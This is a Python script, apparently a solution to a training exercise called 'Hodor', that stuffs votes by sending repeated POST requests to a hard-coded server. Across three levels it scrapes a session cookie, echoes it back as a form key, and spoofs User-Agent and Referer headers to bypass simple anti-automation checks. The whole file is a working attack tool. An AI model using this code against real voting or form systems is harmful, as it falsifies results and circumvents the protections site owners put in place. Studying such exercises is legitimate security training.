import requests
import time
from tqdm import tqdm
from sys import argv, exit
from colorama import Fore, Style

def art():
    return """
                             _///_,
                     .      / ` ' '>
                       )   o'  __/_'>
                      (   /  _/  )_\'> Welcome to Hodor
                       ' "__/   /_/\_>
                           ____/_/_/_/
                          /,---, _/ /
                         ""  /_/_/_/
                            /_(_(_(_                 \\
                           (   \_\_\\_               )\\
                            \'__\_\_\_\__            ).\\
                            //____|___\__)           )_/
                            |  _  \'___'_(           /'
                             \_ (-'\'___'_\      __,'_'
                             __) \  \\___(_   __/.__,'
                           ,((,-,__\  '", __\_/. __,'
                                       '"./_._._-'
    """

class Hodor:
    def __init__(self):
        self.url = ""
        self.headers = {}
        self.postdata = ""
        self.req = ""
    
    @staticmethod
    def hack_loop(self, n):
        for i in tqdm(range(n)):
            x = requests.post(self.url, data = self.postdata, headers=self.headers)
            print("")

    @staticmethod
    def faster_loop(self, n):
        for i in tqdm(range(n)):
            self.req.post(self.url, data=self.postdata)
            print("")


    def level_0(self, n):
        self.url = 'http://158.69.76.135/level0.php'
        self.headers = {
            "Content-Type": 'application/x-www-form-urlencoded',
        }
        self.postdata = "id=1611&holdthedoor=Submit+Query"
        Hodor.hack_loop(self, int(n))

    def level_1(self, n):
        self.url = 'http://158.69.76.135/level1.php'
        self.headers = {
            "Content-Type": 'application/x-www-form-urlencoded',
            "Cookie": 'HoldTheDoor='
        }
        self.postdata = "id=1611&holdthedoor=Submit+Query&key="
        seccion = requests.Session()
        response = seccion.get('http://158.69.76.135/level1.php')
        cookie = seccion.cookies.get_dict()['HoldTheDoor']
        self.postdata += cookie
        self.headers['Cookie'] += cookie 
        Hodor.hack_loop(self, int(n))

    def level_2(self, n):
        self.url = 'http://158.69.76.135/level2.php'
        req = requests.Session()
        req.get(self.url)
        cookies = req.cookies.get_dict()['HoldTheDoor']
        req.headers.update({
            "Content-Type" : "application/x-www-form-urlencoded",
            "Cookie" : "HoldTheDoor=" + cookies,
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0",
            "Referer": "http://158.69.76.135/level2.php"
        })
        self.req = req
        self.postdata = "id=1611&holdthedoor=Submit+Query&key=" + cookies
        Hodor.faster_loop(self, n)


def parse_Argv():
    if len(argv) != 3:
        print("Invalid arguments")
        exit(1)
    
    level = argv[1]
    votes = argv[2]
    if level == '0':
        h = Hodor()
        h.level_0(int(votes))
        print(f"Hodor number {level} is done!!!!!!!!!")
    elif level == '1':
        h = Hodor()
        h.level_1(int(votes))
        print(f"Hodor number {level} is done!!!!!!!!!")
    elif level == '2':
        h = Hodor()
        h.level_2(int(votes))
        print(f"Hodor number {level} is done!!!!!!!!!")
    else:
        print("level is not added")
        exit(1)



if __name__ == '__main__':
    print(Fore.GREEN)
    print(art())
    print("Starting....")
    time.sleep(2)
    parse_Argv()
    print(Style.RESET_ALL)
